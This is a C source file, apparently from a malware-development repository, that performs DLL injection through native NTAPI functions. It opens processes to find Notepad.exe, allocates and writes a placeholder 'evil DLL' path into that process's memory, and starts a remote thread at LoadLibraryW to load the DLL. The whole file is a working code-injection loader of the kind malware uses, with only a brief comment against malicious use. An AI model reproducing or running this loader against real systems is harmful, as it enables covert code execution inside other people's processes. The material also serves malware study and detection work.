// DLL Injection using the NTAPI implementation
// https://github.com/Solaar7/Maldev
// Please do not use this code maliciously without EXPLICIT permission

#include "hNTAPI.h"
#include <Psapi.h>

HMODULE getMod(LPCWSTR modName) {
	HMODULE hModule = NULL;
	
	hModule = GetModuleHandleW(modName);
	
	if (hModule == NULL) {
		warn("Could not get handle to module, error: 0x%lx", GetLastError());
		return NULL;
	}

	okay("Got the handle to module ", modName);
	info("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
	return hModule;
}

int main() {
	/*-----[INITIALIZING VARIABLES]-----*/
	DWORD						PID						= NULL;
	HANDLE						hProcess				= NULL;
	HANDLE						hThread					= NULL;
	HMODULE						hKernel32				= NULL;
	HMODULE						hNtdll					= NULL;
	LPVOID						rBuffer					= NULL;

	pNtCreateThreadEx			SolaarCreateThreadEx	= NULL;
	pNtOpenProcess				SolaarOpenProcess		= NULL;
	pNtWriteVirtualMemory		SolaarWriteMem			= NULL;
	pNtAllocateVirtualMemory	SolaarAllocMem			= NULL;
	pNtWaitForSingleObject		SolaarWait				= NULL;
	pNtClose					SolaarClose				= NULL;
	PTHREAD_START_ROUTINE		SolaarLoadLibrary		= NULL;
	NTSTATUS					status					= NULL;
		
	char						targetProcess[]			= "Notepad.exe";
	DWORD						aProcesses[1024]		= {};
	DWORD						cbNeeded				= NULL;
	DWORD						cProcesses				= NULL;
	CLIENT_ID					CID;

	wchar_t						dllPath[MAX_PATH]		= L"PATH TO EVIL DLL";
	size_t						pathSize				= sizeof(dllPath);
	size_t						bytesWritten			= 0;
	OBJECT_ATTRIBUTES			OA						= { sizeof(OA), NULL };


	hKernel32 = getMod(L"kernel32.dll");
	hNtdll = getMod(L"ntdll.dll");

	if (hNtdll == NULL || hKernel32 == NULL) {
		warn("module(s) == NULL. error: 0x%lx", GetLastError());
		goto CLEANUP;
	}

	/*-----[GETTING NTAPI FUNCTIONS]-----*/
	SolaarCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
	okay("Got the address of NtCreateThreadEx from NTDLL");
	info("\\___[ SolaarCreateThread\n\t\\_0x%p]\n", SolaarCreateThreadEx);

	SolaarAllocMem = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	okay("Got the address of NtAllocateVirtualMemory from NTDLL");
	info("\\___[ SolaarAllocMem\n\t\\_0x%p]\n", SolaarAllocMem);

	SolaarOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
	okay("Got the address of NtOpenProcess from NTDLL");
	info("\\___[ SolaarOpenProcess\n\t\\_0x%p]\n", SolaarOpenProcess);

	SolaarLoadLibrary = (PTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	okay("Got the address of LoadLibraryW from KERNEL32");
	info("\\___[ SolaarLoadLibrary\n\t\\_0x%p]\n", SolaarLoadLibrary);

	SolaarWriteMem = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	okay("Got the address of NtWriteVirtualMemory from NTDLL");
	info("\\___[ SolaarWriteMem\n\t\\_0x%p]\n", SolaarWriteMem);

	SolaarWait = (pNtWaitForSingleObject)GetProcAddress(hNtdll, "NtWaitForSingleObject");
	okay("Got the address of NtWaitForSingleObject from NTDLL");
	info("\\___[ SolaarWait\n\t\\_0x%p]\n", SolaarWait);

	SolaarClose = (pNtClose)GetProcAddress(hNtdll, "NtClose");
	okay("Got the address of NtClose from NTDLL");
	info("\\___[ SolaarClose\n\t\\_0x%p]\n", SolaarClose);



	/*------[GATHERING LIST OF PROCESSES]------*/
	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
		warn("Could not enumerate processes, error: %ld", GetLastError());
		return -1;
	}

	cProcesses = cbNeeded / sizeof(DWORD);

	/*------[LOCATING TARGET PROCESS]------*/
	for (int i = 0; i < cProcesses; i++) {
		CID = { (HANDLE)aProcesses[i], NULL };
		TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
		status = SolaarOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
		printf("Status: 0x%lx\n",status);
		if (status == STATUS_SUCCESS)
		{
			HMODULE hMod;
			cbNeeded = NULL;

			if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
				&cbNeeded))
			{
				GetModuleBaseName(hProcess, hMod, szProcessName,
					sizeof(szProcessName) / sizeof(TCHAR));
			}

			info(TEXT("%s  (PID: %u)\n"), szProcessName, aProcesses[i]);
			if (strcmp(szProcessName, targetProcess) == 0) {
				printf("TARGET PROCESS LOCATED!!!\n");
				PID = aProcesses[i];
				break;
			}
		}
	}
	if (PID == NULL) {
		warn("Couldn't get PID for process");
		return -1;
	}




	status = SolaarAllocMem(hProcess, &rBuffer, NULL, &pathSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	
	if (status != STATUS_SUCCESS) {
		warn("failed to allocate memory, error: 0x%lx", status);
		goto CLEANUP;
	}

	okay("Allocated memory in target process");

	status = SolaarWriteMem(hProcess, rBuffer, dllPath, pathSize, &bytesWritten);
	if (status != STATUS_SUCCESS) {
		warn("Could write to process memory, error: 0x%lx", status);
		goto CLEANUP;
	}
	okay("Wrote %zu-bytes to process memory", bytesWritten);

	status = SolaarCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, SolaarLoadLibrary, rBuffer, FALSE, NULL, NULL, NULL, NULL);

	if (status != STATUS_SUCCESS) {
		warn("failed to create thread, error: 0x%lx", status);
		goto CLEANUP;
	}

	okay("created thread, waiting for it to finish");


	status = SolaarWait(hThread, TRUE, NULL);
	okay("thread finished execution.");
	info("cleaning up now");
	goto CLEANUP;

CLEANUP:

	if (hThread != NULL) {
		info("Closing Handle to Thread");
		SolaarClose(hThread);
	}

	if (hProcess != NULL) {
		info("Closing Handle to Process");
		SolaarClose(hProcess);
	}

	okay("Finished cleanup, goodbye o/");
	return EXIT_SUCCESS;
}
